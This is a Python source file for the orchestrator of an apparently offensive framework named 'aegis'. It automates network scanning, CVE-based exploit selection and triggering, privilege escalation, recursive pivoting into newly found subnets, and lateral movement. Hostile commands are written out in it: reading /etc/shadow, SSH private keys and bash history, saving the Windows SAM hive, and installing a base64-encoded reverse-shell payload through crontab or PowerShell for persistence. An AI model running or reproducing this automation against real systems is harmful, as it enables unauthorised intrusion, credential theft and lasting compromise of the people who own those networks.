from __future__ import annotations

import asyncio
import ipaddress
import json
import re
import time
from dataclasses import dataclass, field
from typing import Any, Protocol

from aegis.core.credentials import Credential, CredentialCache
from aegis.core.cve import BatchCveAggregator, CVEMatch, CVEDataSource
from aegis.core.exploit import Exploit, ExploitPayload, ExploitRank, ExploitResult, ExploitTarget
from aegis.core.payload import PayloadGenerator, ScriptPayload, ShellcodePayload
from aegis.core.privesc import PrivescEngine, PrivescResult
from aegis.core.reporting import (
    Finding,
    JsonReportBuilder,
    MarkdownReportBuilder,
    ReportBuilder,
    ReportFormat,
)
from aegis.core.scanner import (
    SCAN_PROFILE_AGGRESSIVE,
    SCAN_PROFILE_BALANCED,
    SCAN_PROFILE_STEALTH,
    PortScanResult,
    ScanProfile,
    Scanner,
    ServiceDiscovery,
    SessionScanner,
)
from aegis.core.session import Session, SessionManager
from aegis.core.vulnerability import Confidence, VulnerabilityEngine, VulnerabilityFinding
from aegis.utils.errors import AegisError, ScanError
from aegis.utils.logger import AegisLogger
from aegis.utils.threading import TaskPool


RETRY_LIMIT = 3
RETRY_DELAY = 2.0

CIRCUIT_BREAKER_THRESHOLD = 5
CIRCUIT_BREAKER_RESET = 60.0


@dataclass
class EngagementStatus:
    phase: str = "idle"
    targets_identified: int = 0
    ports_scanned: int = 0
    vulnerabilities_found: int = 0
    exploits_attempted: int = 0
    exploits_succeeded: int = 0
    sessions_active: int = 0
    sessions_degraded: int = 0
    credentials_harvested: int = 0
    subnets_queued: int = 0
    privesc_findings: int = 0
    current_host: str = ""
    current_port: int = 0
    elapsed_seconds: float = 0.0
    started_at: float = field(default_factory=time.time)
    extra: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "phase": self.phase,
            "targets_identified": self.targets_identified,
            "ports_scanned": self.ports_scanned,
            "vulnerabilities_found": self.vulnerabilities_found,
            "exploits_attempted": self.exploits_attempted,
            "exploits_succeeded": self.exploits_succeeded,
            "sessions_active": self.sessions_active,
            "sessions_degraded": self.sessions_degraded,
            "credentials_harvested": self.credentials_harvested,
            "subnets_queued": self.subnets_queued,
            "privesc_findings": self.privesc_findings,
            "current_host": self.current_host,
            "current_port": self.current_port,
            "elapsed_seconds": time.time() - self.started_at,
            **self.extra,
        }


class ProgressReporter(Protocol):
    def __call__(self, status: EngagementStatus) -> None:
        ...


def _write_json_status(status: EngagementStatus) -> None:
    try:
        with open("/tmp/aegis_status.json", "w") as f:
            json.dump(status.to_dict(), f, indent=2)
    except OSError:
        pass


class CircuitBreaker:
    def __init__(self, threshold: int = CIRCUIT_BREAKER_THRESHOLD,
                 reset_time: float = CIRCUIT_BREAKER_RESET) -> None:
        self._failures: dict[str, int] = {}
        self._open_since: dict[str, float] = {}
        self._threshold = threshold
        self._reset_time = reset_time

    def record_failure(self, key: str) -> None:
        self._failures[key] = self._failures.get(key, 0) + 1
        if self._failures[key] >= self._threshold:
            self._open_since[key] = time.time()

    def record_success(self, key: str) -> None:
        self._failures.pop(key, None)
        self._open_since.pop(key, None)

    def is_open(self, key: str) -> bool:
        if key not in self._open_since:
            return False
        if time.time() - self._open_since[key] > self._reset_time:
            self._failures.pop(key, None)
            self._open_since.pop(key, None)
            return False
        return True

    def failures(self, key: str) -> int:
        return self._failures.get(key, 0)


async def retry_async(fn, retries: int = RETRY_LIMIT, delay: float = RETRY_DELAY,
                      label: str = "operation") -> Any:
    last_exc: Exception | None = None
    for attempt in range(1, retries + 1):
        try:
            return await fn()
        except Exception as e:
            last_exc = e
            if attempt < retries:
                await asyncio.sleep(delay * attempt)
    raise last_exc or AegisError(f"{label} failed after {retries} retries")


class Orchestrator:
    def __init__(
        self,
        scanner: Scanner,
        vuln_engine: VulnerabilityEngine,
        session_mgr: SessionManager,
        cve_source: CVEDataSource | None = None,
        payload_gen: PayloadGenerator | None = None,
        report_builder: ReportBuilder | None = None,
        task_pool: TaskPool | None = None,
        log_dir: str | None = None,
        cred_cache: CredentialCache | None = None,
        progress_reporter: ProgressReporter | None = None,
        status_queue: asyncio.Queue[EngagementStatus] | None = None,
        privesc_engine: PrivescEngine | None = None,
    ) -> None:
        self._scanner = scanner
        self._vuln_engine = vuln_engine
        self._session_mgr = session_mgr
        self._cve_source = cve_source
        self._payload_gen = payload_gen or ScriptPayload(lhost="127.0.0.1", lport=4444)
        self._report = report_builder or MarkdownReportBuilder()
        self._pool = task_pool or TaskPool(max_workers=20)
        self._cred_cache = cred_cache or CredentialCache()
        self._privesc = privesc_engine or PrivescEngine()
        self._log = AegisLogger("orchestrator", log_dir=log_dir).get()

        self._discoveries: list[ServiceDiscovery] = []
        self._vuln_findings: list[VulnerabilityFinding] = []
        self._sessions: list[Session] = []
        self._exploit_results: list[ExploitResult] = []
        self._privesc_results: list[PrivescResult] = []

        self._status = EngagementStatus()
        self._reporter = progress_reporter or _write_json_status
        self._status_queue = status_queue
        self._circuit_breaker = CircuitBreaker()

        self._subnet_queue: asyncio.Queue[str] = asyncio.Queue()
        self._scanned_subnets: set[ipaddress.IPv4Network] = set()
        self._scan_max_depth = 3
        self._recursion_lock = asyncio.Lock()

    # ------------------------------------------------------------------
    # Main entry point
    # ------------------------------------------------------------------

    async def run(
        self,
        targets: list[str],
        ports: list[int] | None = None,
        fast_scan: bool = False,
        auto_exploit: bool = True,
        recursive: bool = False,
        max_recursion_depth: int = 2,
    ) -> None:
        self._log.info("Aegis engagement started — targets=%s", targets)
        self._scan_max_depth = max_recursion_depth
        self._status = EngagementStatus()
        self._status.started_at = time.time()

        try:
            self._status.phase = "reconnaissance"
            self._report_progress()

            for target in targets:
                await self._subnet_queue.put(target)

            await self._recursive_scan_loop(auto_exploit)

            await self._phase_report()

        except AegisError:
            self._log.exception("Fatal error — aborting engagement")
            self._status.phase = "failed"
            self._report_progress()
            raise
        finally:
            await self._session_mgr.cleanup_all()

        self._status.phase = "completed"
        self._report_progress()
        self._log.info("Aegis engagement complete")

    # ------------------------------------------------------------------
    # Recursive scan-exploit-pivot loop
    # ------------------------------------------------------------------

    async def _recursive_scan_loop(self, auto_exploit: bool) -> None:
        while not self._subnet_queue.empty() or self._pool.pending > 0:
            try:
                subnet_str = self._subnet_queue.get_nowait()
            except asyncio.QueueEmpty:
                await asyncio.sleep(0.5)
                continue

            try:
                subnet_net = ipaddress.IPv4Network(subnet_str, strict=False)
            except ValueError:
                self._log.warning("Invalid subnet: %s — skipping", subnet_str)
                continue

            if subnet_net in self._scanned_subnets:
                continue
            self._scanned_subnets.add(subnet_net)

            depth = self._subnet_depth(subnet_net)
            if depth > self._scan_max_depth:
                self._log.info("Max recursion depth reached for %s (%d)", subnet_net, depth)
                continue

            if not self._pivot_session_alive(subnet_str):
                self._log.info("Skipping %s — pivot session is dead", subnet_str)
                continue

            self._log.info("Scanning subnet: %s (depth %d/%d)", subnet_net, depth, self._scan_max_depth)
            self._status.current_host = str(subnet_net)
            self._report_progress()

            try:
                await retry_async(
                    lambda: self._phase_scan([subnet_str], None, False),
                    label=f"scan {subnet_str}",
                )
            except Exception as e:
                self._log.error("Scan failed for %s after retries: %s", subnet_str, e)
                continue

            if not self._discoveries:
                self._log.info("No hosts in %s", subnet_net)
                self._status.subnets_queued = self._subnet_queue.qsize()
                self._report_progress()
                continue

            if auto_exploit:
                await self._phase_detect()
                await self._phase_exploit()

                await self._phase_privesc()

                await self._phase_harvest_creds()

                for session in self._sessions:
                    if session.is_alive():
                        await self._discover_new_subnets(session)

            self._status.subnets_queued = self._subnet_queue.qsize()
            self._report_progress()

    def _subnet_depth(self, net: ipaddress.IPv4Network) -> int:
        depth = 0
        current = net
        visited: set[ipaddress.IPv4Network] = set()
        while current in self._scanned_subnets and current not in visited:
            visited.add(current)
            depth += 1
            if current.prefixlen >= 24:
                supernet = current.supernet(new_prefix=current.prefixlen - 8)
                current = supernet
            else:
                break
        return depth

    def _pivot_session_alive(self, subnet_str: str) -> bool:
        for sid, session in self._session_mgr.list_active().items():
            for route in session.pivots:
                if route.matches(subnet_str.split("/")[0]):
                    if not session.is_alive():
                        return False
        return True

    async def _discover_new_subnets(self, session: Session) -> None:
        async with self._recursion_lock:
            try:
                result = await session.send("ip route 2>/dev/null || route print 2>nul", timeout=10.0)
            except Exception as e:
                self._log.debug("Failed to get routes from session %s: %s", session.id, e)
                return

            for line in result.splitlines():
                match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.0)", line)
                if match:
                    subnet_str = match.group(1) + "/24"
                    try:
                        net = ipaddress.IPv4Network(subnet_str, strict=False)
                        if net not in self._scanned_subnets:
                            self._log.info("Discovered new subnet via pivot: %s", net)
                            await self._subnet_queue.put(str(net))
                            self._status.subnets_queued = self._subnet_queue.qsize()
                    except ValueError:
                        continue

    # ------------------------------------------------------------------
    # Standard phases
    # ------------------------------------------------------------------

    async def _phase_scan(self, targets: list[str], ports: list[int] | None, fast: bool) -> None:
        self._log.info("Phase 1 — Reconnaissance")
        self._status.phase = "scanning"
        self._report_progress()

        self._discoveries = await self._scanner.discover(targets, ports, fast)
        for d in self._discoveries:
            self._status.targets_identified += 1
            self._status.ports_scanned += len(d.ports)

        self._report.set_scan_summary({
            "targets": targets,
            "hosts_found": len(self._discoveries),
            "total_ports_open": sum(len(d.ports) for d in self._discoveries),
        })
        self._log.info("Discovery complete — %d hosts", len(self._discoveries))
        self._report_progress()

    async def _phase_detect(self) -> None:
        self._log.info("Phase 2 — Vulnerability detection")
        self._status.phase = "detecting"
        self._report_progress()

        if self._cve_source and self._discoveries:
            aggregator = BatchCveAggregator(self._cve_source)
            cve_map = await aggregator.resolve(self._discoveries)
        else:
            cve_map = {}

        self._vuln_findings = await self._vuln_engine.evaluate_batch(self._discoveries, cve_map=cve_map)

        for vf in self._vuln_findings:
            self._report.add_finding(Finding.from_vuln_finding(vf))
        self._status.vulnerabilities_found = len(self._vuln_findings)
        self._log.info("Detection complete — %d findings", len(self._vuln_findings))
        self._report_progress()

    async def _phase_exploit(self) -> None:
        self._log.info("Phase 3 — Exploitation")
        self._status.phase = "exploiting"
        self._report_progress()

        targets_map: dict[tuple[str, int], VulnerabilityFinding] = {}
        for vf in self._vuln_findings:
            if vf.port:
                targets_map[(vf.target, vf.port)] = vf

        for (host, port), finding in targets_map.items():
            cb_key = f"{host}:{port}"
            if self._circuit_breaker.is_open(cb_key):
                self._log.info("Circuit breaker open for %s — skipping", cb_key)
                continue

            exploit_cls = self._select_exploit(finding)
            if exploit_cls is None:
                continue

            self._status.current_host = host
            self._status.current_port = port
            self._report_progress()

            target = ExploitTarget(host=host, port=port, service=finding.service or "", extra={})
            exploit = exploit_cls(target)

            try:
                if not await exploit.quick_probe():
                    self._log.info("Quick-probe failed — %s:%d", host, port)
                    continue
                if await exploit.probe():
                    self._status.exploits_attempted += 1

                    if exploit.requires_payload and exploit._payload is None:
                        payload = ExploitPayload(
                            lhost="127.0.0.1",
                            lport=4444,
                            arch="x64",
                            target_os="linux",
                        )
                        exploit.set_payload(payload)

                    result = await exploit.trigger()
                    if result.success and result.session:
                        self._sessions.append(result.session)
                        result.session.start_heartbeats()
                        await self._session_mgr.register(result.session)
                        self._status.exploits_succeeded += 1
                        self._status.sessions_active = len(self._sessions)
                        self._circuit_breaker.record_success(cb_key)
                    else:
                        self._circuit_breaker.record_failure(cb_key)

                    self._exploit_results.append(result)
                    self._report.log_exploit_attempt({
                        "target": host,
                        "port": port,
                        "exploit": exploit_cls.name,
                        "rank": exploit.rank.name,
                        "success": result.success,
                        "summary": result.summary,
                    })
                else:
                    self._log.info("Probe failed — %s:%d not vulnerable to %s", host, port, exploit_cls.name)
            except Exception:
                self._log.exception("Exploit failed — %s:%d", host, port)
                self._circuit_breaker.record_failure(cb_key)

            self._report_progress()

    async def _phase_privesc(self) -> None:
        degraded = [s for s in self._sessions if s.degraded]
        healthy = [s for s in self._sessions if not s.degraded]
        candidates = degraded + healthy

        if not candidates:
            self._log.info("No sessions — skipping privesc")
            return

        self._log.info("Phase — Privilege escalation (%d sessions)", len(candidates))
        self._status.phase = "privesc"
        self._report_progress()

        for session in candidates:
            if not session.is_alive():
                continue

            os_type = "linux" if "linux" in session.metadata.get("os", "").lower() else "windows"

            try:
                results = await self._privesc.run_checks(session, os_type=os_type)
            except Exception as e:
                self._log.debug("Privesc checks failed for %s: %s", session.id, e)
                continue

            for pr in results:
                self._privesc_results.append(pr)
                if pr.vulnerable:
                    self._status.privesc_findings += 1
                    self._log.info(
                        "Privesc: %s on %s (%s) — %s",
                        pr.check.name, session.target_host, pr.check.risk, pr.suggestion,
                    )
                    self._report.log_exploit_attempt({
                        "session": session.id,
                        "exploit": f"privesc/{pr.check.name}",
                        "risk": pr.check.risk,
                        "success": pr.vulnerable,
                        "summary": pr.suggestion,
                    })

        self._report_progress()

    async def _phase_harvest_creds(self) -> None:
        if not self._sessions:
            return
        self._log.info("Phase — Credential harvesting (%d sessions)", len(self._sessions))
        self._status.phase = "harvesting"
        self._report_progress()

        for session in self._sessions:
            if not session.is_alive():
                continue
            async with session.lock():
                creds = await self._harvest_session(session)
                for c in creds:
                    self._cred_cache.store(c)
                self._status.credentials_harvested = len(self._cred_cache.all())
                self._report_progress()

            if self._cred_cache.has_credential_for(session.target_host):
                self._vuln_findings = self._vuln_engine.re_evaluate_with_creds(
                    self._vuln_findings, session.target_host
                )

            lateral_attempts = self._cred_cache.lateral_move(session.target_host, self._discoveries)
            for cred, target_host, target_port, service in lateral_attempts:
                self._log.info(
                    "Lateral attempt — %s:%s@%s:%d (from %s)",
                    cred.username, cred.secret_type, target_host, target_port, cred.source_host,
                )

        self._log.info(
            "Credential harvest complete — %d credentials cached",
            len(self._cred_cache.all()),
        )

    async def _harvest_session(self, session: Session) -> list[Credential]:
        creds: list[Credential] = []

        linux_commands = {
            "shadow": "cat /etc/shadow 2>/dev/null",
            "passwd": "cat /etc/passwd 2>/dev/null",
            "id_rsa": "cat ~/.ssh/id_rsa 2>/dev/null",
            "bash_history": "cat ~/.bash_history 2>/dev/null | grep -E '(ssh|pass|login|curl|wget).*@' | head -5",
            "config": "cat ~/.ssh/config 2>/dev/null",
        }

        windows_commands = {
            "sam": "reg save HKLM\\SAM %TEMP%\\sam.save 2>nul && echo SAVED",
            "cmdkey": "cmdkey /list 2>nul",
            "powershell_pass": 'powershell -Command "Get-ChildItem -Path Env: -Recurse 2>$null | Select-Object -ExpandProperty Value" 2>nul',
        }

        is_linux = "linux" in session.metadata.get("os", "").lower() if session.metadata.get("os") else True
        cmds = linux_commands if is_linux else windows_commands

        for source, cmd in cmds.items():
            try:
                output = await session.send(cmd, timeout=15.0)
                if not output or "denied" in output.lower() or "not found" in output.lower():
                    continue

                if source == "shadow":
                    for line in output.splitlines():
                        if ":" in line and not line.startswith("#"):
                            parts = line.split(":")
                            if len(parts) >= 2 and parts[1] and parts[1] != "*" and parts[1] != "!":
                                creds.append(Credential(
                                    username=parts[0],
                                    secret=parts[1],
                                    secret_type="hash",
                                    source_host=session.target_host,
                                    source_session=session.id,
                                    confidence=0.7,
                                ))
                elif source == "bash_history":
                    for line in output.splitlines():
                        ssh_match = re.search(r"ssh\s+(\w+)@(\S+)", line)
                        if ssh_match:
                            creds.append(Credential(
                                username=ssh_match.group(1),
                                secret="",
                                secret_type="password",
                                source_host=ssh_match.group(2),
                                source_session=session.id,
                                confidence=0.4,
                                extra={"source_history": line.strip()},
                            ))
                elif source == "cmdkey":
                    for line in output.splitlines():
                        if "Target" in line or "User" in line:
                            creds.append(Credential(
                                username=line.strip(),
                                secret="",
                                secret_type="password",
                                source_host=session.target_host,
                                source_session=session.id,
                                confidence=0.5,
                                extra={"raw": line.strip()},
                            ))
            except Exception as e:
                self._log.debug("Harvest %s failed: %s", source, e)

        return creds

    async def _phase_post_exploit(self) -> None:
        if not self._sessions:
            self._log.info("No active sessions — skipping post-exploitation")
            return
        self._log.info("Phase 4 — Post-exploitation / persistence (%d sessions)", len(self._sessions))
        self._status.phase = "post-exploitation"
        self._report_progress()

        for session in self._sessions:
            if not session.is_alive():
                continue
            if session.integrity != "root":
                self._log.info("Attempting privesc on session %s", session.id)
                privesc = self._build_privesc(session)
                if privesc:
                    result = await privesc.trigger(session=session)
                    self._report.log_exploit_attempt({
                        "session": session.id,
                        "exploit": "privesc",
                        "success": result.success,
                        "summary": result.summary,
                    })
                    if result.success:
                        session.integrity = "root"

            payload = await self._payload_gen.generate("reverse_tcp")
            self._log.info("Generated payload for session %s (%d bytes)", session.id, len(payload.raw))

            try:
                persist_cmd = (
                    f"echo '{payload.encoded.decode()}' | base64 -d | crontab -"
                    if "linux" in (session.metadata.get("os", "") or "")
                    else f'cmd /c echo {payload.encoded.decode()} > %TEMP%\\persist.ps1 && powershell -File %TEMP%\\persist.ps1'
                )
                result = await session.send(persist_cmd, timeout=30.0)
                self._log.info("Persistence deployed on session %s: %s", session.id, result[:100])
            except Exception as e:
                self._log.warning("Persistence deployment failed on session %s: %s", session.id, e)

            try:
                await self._session_mgr.start_pivot_proxy(session.id)
                self._log.info("Pivot proxy started for session %s", session.id)
            except Exception as e:
                self._log.debug("Pivot proxy not started for session %s: %s", session.id, e)

        self._report_progress()

    async def _phase_report(self) -> None:
        self._log.info("Phase 5 — Reporting")
        self._status.phase = "reporting"
        self._report_progress()

        md_path = "/tmp/aegis_report.md"
        json_path = "/tmp/aegis_report.json"
        await self._report.export(ReportFormat.MARKDOWN, md_path)
        await self._report.export(ReportFormat.JSON, json_path)
        self._log.info("Reports written — %s, %s", md_path, json_path)
        self._report_progress()

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _select_exploit(self, finding: VulnerabilityFinding) -> type[Exploit] | None:
        candidates: list[tuple[type[Exploit], float, int]] = []
        for cls in Exploit._registry.values():
            priority = 0
            if finding.cve and any(cve in cls.cve_ids for cve in [finding.cve.cve_id]):
                priority += 10
            if finding.port and finding.port in cls.affected_ports:
                priority += 5
            if not priority:
                continue
            cvss = finding.cve.cvss_score if finding.cve else 0.0
            candidates.append((cls, cvss, cls.rank.value))

        if not candidates:
            return None

        candidates.sort(key=lambda x: (-x[2], -x[1]))
        return candidates[0][0]

    def _build_privesc(self, session: Session) -> Exploit | None:
        target = ExploitTarget(host=session.target_host, port=session.target_port, service="")
        for cls in Exploit._registry.values():
            if cls.name == "privesc":
                return cls(target)
        return None

    def _scan_progress(self, completed: int, total: int, current: PortScanResult | None = None) -> None:
        if current:
            self._status.current_host = current.host
            self._status.current_port = current.port
        pct = (completed / total) * 100 if total else 0
        self._log.debug("Scan progress — %d/%d (%.1f%%)", completed, total, pct)
        self._report_progress()

    def _report_progress(self) -> None:
        self._status.elapsed_seconds = time.time() - self._status.started_at
        self._status.sessions_active = len([s for s in self._sessions if s.is_alive()])
        self._status.sessions_degraded = len([s for s in self._sessions if s.degraded])
        self._reporter(self._status)
        if self._status_queue is not None:
            try:
                self._status_queue.put_nowait(self._status)
            except asyncio.QueueFull:
                pass

    @property
    def status(self) -> EngagementStatus:
        return self._status

    @property
    def credential_cache(self) -> CredentialCache:
        return self._cred_cache
